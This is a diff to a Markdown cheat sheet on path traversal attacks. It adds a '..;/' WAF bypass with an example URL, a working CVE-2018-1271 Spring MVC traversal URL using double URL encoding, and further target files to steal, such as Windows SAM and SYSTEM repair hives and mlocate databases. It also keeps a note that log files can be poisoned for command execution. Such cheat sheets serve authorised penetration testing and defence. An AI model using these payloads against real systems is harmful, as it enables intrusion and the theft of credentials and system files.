@@ -6,14 +6,16 @@
 
 * [Tools](#tools)
 * [Basic exploitation](#basic-exploitation)
-    * [16 bits Unicode encoding](#)
-    * [UTF-8 Unicode encoding](#)
-    * [Bypass "../" replaced by ""](#)
-    * [Double URL encoding](#)
+    * [16 bits Unicode encoding](#16-bits-unicode-encoding)
+    * [UTF-8 Unicode encoding](#utf-8-unicode-encoding)
+    * [Bypass "../" replaced by ""](#bypass--replaced-by-)
+    * [Bypass "../" with ";"](#bypass--with-)
+    * [Double URL encoding](#double-url-encoding)
     * [UNC Bypass](#unc-bypass)
 * [Path Traversal](#path-traversal)
-    * [Interesting Linux files](#)
-    * [Interesting Windows files](#)
+    * [Interesting Linux files](#interesting-linux-files)
+    * [Interesting Windows files](#interesting-windows-files)
+* [References](#references)
 
 ## Tools
 
@@ -62,6 +64,13 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 ...\.\
 ```
 
+### Bypass "../" with ";"
+
+```powershell
+..;/
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+```
+
 ### Double URL encoding
 
 ```powershell
@@ -69,6 +78,8 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 / = %252f
 \ = %255c
 ```
+
+**e.g:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`
 
 ### UNC Bypass
 
@@ -106,9 +117,19 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 /home/$USER/.bash_history
 /home/$USER/.ssh/id_rsa
 /var/run/secrets/kubernetes.io/serviceaccount
+/var/lib/mlocate/mlocate.db
+/var/lib/mlocate.db
 ```
 
 ### Interesting Windows files
+
+Always existing file in recent Windows machine. 
+Ideal to test path traversal but nothing much interesting inside...
+
+```powershell
+c:\windows\system32\license.rtf
+c:\windows\system32\eula.txt
+```
 
 Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
 
@@ -133,6 +154,8 @@ c:/unattend.txt
 c:/unattend.xml
 c:/unattended.txt
 c:/unattended.xml
+c:/windows/repair/sam
+c:/windows/repair/system
 ```
 
 The following log files are controllable and can be included with an evil payload to achieve a command execution
@@ -152,5 +175,6 @@ The following log files are controllable and can be included with an evil payloa
 
 ## References
 
+* [Path Traversal Cheat Sheet: Windows](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
 * [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
 * [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
